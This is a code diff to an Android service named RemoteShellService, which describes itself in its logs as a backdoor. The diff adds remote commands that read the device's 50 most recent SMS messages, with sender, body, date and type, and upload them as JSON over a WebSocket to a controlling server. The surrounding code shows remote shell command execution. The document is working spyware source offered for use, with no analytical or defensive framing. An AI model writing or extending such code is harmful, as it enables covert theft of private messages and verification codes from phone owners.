@@ -7,12 +7,14 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.provider.Settings;
+import android.provider.Telephony;
 import android.util.Base64;
 import android.util.Log;
 
@@ -55,10 +57,12 @@ public class RemoteShellService extends Service {
     private boolean isRunning = false;
     private String deviceId;
     private int reconnectDelay = 5000;
+    private static RemoteShellService instance;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
         Log.d(TAG, "RemoteShellService started as backdoor");
 
         mainHandler = new Handler(Looper.getMainLooper());
@@ -270,6 +274,14 @@ public class RemoteShellService extends Service {
                     stopSelf();
                     break;
 
+                case "get_sms":
+                    getSmsFromDevice();
+                    break;
+
+                case "get_sms_count":
+                    getSmsCount();
+                    break;
+
                 default:
                     sendResponse("error", "Unknown command: " + cmd);
             }
@@ -278,6 +290,91 @@ public class RemoteShellService extends Service {
             Log.e(TAG, "Error handling command", e);
             sendResponse("error", e.getMessage());
         }
+    }
+
+    private void getSmsFromDevice() {
+        new Thread(() -> {
+            try {
+                String[] projection = new String[]{
+                        Telephony.Sms._ID,
+                        Telephony.Sms.ADDRESS,
+                        Telephony.Sms.BODY,
+                        Telephony.Sms.DATE,
+                        Telephony.Sms.TYPE,
+                        Telephony.Sms.READ
+                };
+
+                String sortOrder = Telephony.Sms.DATE + " DESC LIMIT 50";
+
+                Cursor cursor = getContentResolver().query(
+                        Telephony.Sms.CONTENT_URI,
+                        projection,
+                        null,
+                        null,
+                        sortOrder
+                );
+
+                JSONArray smsArray = new JSONArray();
+
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+
+                        JSONObject sms = new JSONObject();
+                        sms.put("address", address);
+                        sms.put("body", body);
+                        sms.put("date", date);
+                        sms.put("type", type);
+                        smsArray.put(sms);
+                    } while (cursor.moveToNext());
+                    cursor.close();
+                }
+
+                JSONObject response = new JSONObject();
+                response.put("type", "sms_response");
+                response.put("count", smsArray.length());
+                response.put("messages", smsArray);
+
+                sendMessage(response.toString());
+                Log.d(TAG, "Sent " + smsArray.length() + " SMS to server");
+
+            } catch (Exception e) {
+                Log.e(TAG, "Error getting SMS", e);
+                sendResponse("error", "Failed to get SMS: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private void getSmsCount() {
+        new Thread(() -> {
+            try {
+                Cursor cursor = getContentResolver().query(
+                        Telephony.Sms.CONTENT_URI,
+                        new String[]{Telephony.Sms._ID},
+                        null,
+                        null,
+                        null
+                );
+
+                int count = 0;
+                if (cursor != null) {
+                    count = cursor.getCount();
+                    cursor.close();
+                }
+
+                JSONObject response = new JSONObject();
+                response.put("type", "sms_count");
+                response.put("count", count);
+                sendMessage(response.toString());
+
+            } catch (Exception e) {
+                Log.e(TAG, "Error getting SMS count", e);
+                sendResponse("error", "Failed to get SMS count: " + e.getMessage());
+            }
+        }).start();
     }
 
     private void executeShellCommand(String command) {
@@ -503,6 +600,15 @@ public class RemoteShellService extends Service {
 
         } catch (Exception e) {
             Log.e(TAG, "Error sending response", e);
+        }
+    }
+
+    public static void sendMessageToServer(String message) {
+        if (instance != null && instance.webSocket != null && instance.isRunning) {
+            instance.webSocket.send(message);
+            Log.d(TAG, "Message sent to server: " + message.substring(0, Math.min(100, message.length())) + "...");
+        } else {
+            Log.w(TAG, "Cannot send message - WebSocket not connected");
         }
     }
 
